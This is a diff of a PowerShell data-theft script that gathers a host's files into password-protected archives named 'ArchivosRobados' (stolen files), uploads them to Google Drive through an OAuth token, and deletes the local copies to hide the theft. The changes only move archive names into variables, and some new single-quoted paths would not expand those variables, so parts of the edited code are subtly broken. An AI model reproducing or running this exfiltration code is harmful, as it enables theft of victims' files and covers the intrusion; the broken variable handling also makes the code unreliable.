@@ -49,7 +49,8 @@ Install-Module -Name 7Zip4Powershell -RequiredVersion 1.12.0  -Scope CurrentUser
 Start-Sleep -s 3
 $IV11 = "v9(nnlZl8rz:d)mok*D=+;Th[:}LN;P5C{Dp64|-AX5U"
 Write-Host "[+] Zipping files!" -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\backup-$env:computername.zip -Format Zip -Password "$IV11"
+$NomArchivo = "backup-$env:computername.zip"
+Compress-7Zip -Path c:\temp\sys.txt -ArchiveFileName c:\temp\$NomArchivo -Format Zip -Password "$IV11"
 Remove-Item c:\temp\sys.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
 <#
@@ -87,7 +88,8 @@ $pwd1 = [system.web.security.membership]::GeneratePassword(30,15)
 echo ("$pwd1") > c:/temp/sys1.txt
 $IV1 = "D^Z@e8507=>YS#)qj;zgBeZWb!0-Tp(hBEAi:2.S5G/"
 Write-Host "[+] Zipping files!" -ForegroundColor Green
-Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\backup1-$env:computername.zip -Format Zip -Password "$IV1"
+$NomArchivo1 = "backup1-$env:computername.zip"
+Compress-7Zip -Path c:\temp\sys1.txt -ArchiveFileName c:\temp\$NomArchivo1 -Format Zip -Password "$IV1"
 Remove-Item c:\temp\sys1.txt
 Write-Host "[+] File zipped!" -ForegroundColor Green
 <#
@@ -140,7 +142,8 @@ For($i = 1; $i -le $files.count; $i++)
 
 $files | Select name
 Write-Host "[+] Files copied" -ForegroundColor Green
-Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip -Format Zip -Password "$pwd1"
+$ArchivosRobados = "ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip"
+Compress-7Zip -Path $Destination -ArchiveFileName c:\temp\$ArchivosRobados -Format Zip -Password "$pwd1"
 
 Start-Sleep -s 2
 Write-Host "[+] Files zipped" -ForegroundColor Green
@@ -168,7 +171,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted = 'c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip'
+$FileEncrypted = 'c:\temp\$ArchivosRobados'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted
@@ -216,7 +219,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 Start-Sleep -s 3
-Remove-Item c:\temp\ArchivosRobados-$env:computername-Content$(get-date -f yyyy-MM-dd).zip
+Remove-Item c:\temp\$ArchivosRobados
 Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
@@ -239,7 +242,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted2 = 'c:\temp\backup-$env:computername.zip'
+$FileEncrypted2 = 'c:\temp\$NomArchivo'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted2
@@ -287,7 +290,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 Start-Sleep -s 3
-Remove-Item c:\temp\backup-$env:computername.zip
+Remove-Item c:\temp\$NomArchivo
 Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
@@ -310,7 +313,7 @@ $params = @{
 $accessToken = (Invoke-RestMethod @params).access_token
 
 # Change this to the file you want to upload
-$FileEncrypted3 = 'c:\temp\backup1-$env:computername.zip'
+$FileEncrypted3 = 'c:\temp\$NomArchivo1'
 
 # Get the source file contents and details, encode in base64
 $sourceItem = Get-Item $FileEncrypted3
@@ -358,7 +361,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 Start-Sleep -s 3
-Remove-Item c:\temp\backup1-$env:computername.zip
+Remove-Item c:\temp\$NomArchivo1
 Start-Sleep -s 2
 Write-Host "[-] Stolen file deleted from the host..." -ForegroundColor Red
 Write-Host "[+] Init Phiratee..." -ForegroundColor Green
